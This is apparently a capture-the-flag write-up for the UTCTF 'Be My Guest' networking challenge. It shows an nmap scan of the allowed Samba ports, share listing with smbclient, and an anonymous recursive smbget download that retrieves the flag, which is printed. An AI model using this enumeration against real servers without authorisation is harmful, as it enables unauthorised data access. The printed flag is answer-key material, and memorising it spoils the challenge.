## networking

### Be My Guest
Description:
*Can you share some secrets about this box?*

nmap is allowed for this problem. However, you may only target 'misc.utctf.live ports 8881 & 8882.' 
Thank you.

Not familiar with these types of challenges because it's been easier to ignore them!! but once I got the hang of using nmap with the specifics they provided, my confidence shot up. After all I've been using these tools for some time. So lets get that nmap out the way.
```shell
~$ nmap -sC -sV misc.utctf.live -p8881-8882
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 19:33 GMT
Nmap scan report for misc.utctf.live (3.236.87.2)
Host is up (0.080s latency).
rDNS record for 3.236.87.2: ec2-3-236-87-2.compute-1.amazonaws.com

PORT     STATE SERVICE     VERSION
8881/tcp open  netbios-ssn Samba smbd 4.6.2
8882/tcp open  netbios-ssn Samba smbd 4.6.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.86 seconds

```
OK, so I see that both are Samba ports. I initially thought of smbclient.

```shell
~$ smbclient -L \\anonymous -I misc.utctf.live -p8881
Enter WORKGROUP\kartibok's password: 

	Sharename       Type      Comment
	---------       ----      -------
	guest           Disk      Look, but don't touch please.
	IPC$            IPC       IPC Service (Samba Server)
SMB1 disabled -- no workgroup available
~$ smbclient -L \\anonymous -I misc.utctf.live -p8882
Enter WORKGROUP\kartibok's password: 

	Sharename       Type      Comment
	---------       ----      -------
	guest           Disk      Look, but don't touch please.
	IPC$            IPC       IPC Service (Samba Server)
SMB1 disabled -- no workgroup available
:~$ 
```
So that is not available. Next I thought about  'smbget'. I created a folder to store any data, then ran the 'smbget.  
```shell
~$ mkdir samba
~$ cd samba/
~/samba$ smbget -R smb://misc.utctf.live:8881/
Password for [kartibok] connecting to //IPC$/misc.utctf.live: 
Using workgroup WORKGROUP, user kartibok
smb://misc.utctf.live:8881//guest/flag.txt                                 
Ignoring ipc$ share IPC$
Downloaded 30b in 5 seconds
~/samba$ ls
guest
~/samba$ cd guest/
~/samba/guest$ ls
flag.txt
~/samba/guest$ cat flag.txt 
utflag{gu3st_p4ss_4_3v3ry0n3}
```

Flag
utflag{gu3st_p4ss_4_3v3ry0n3}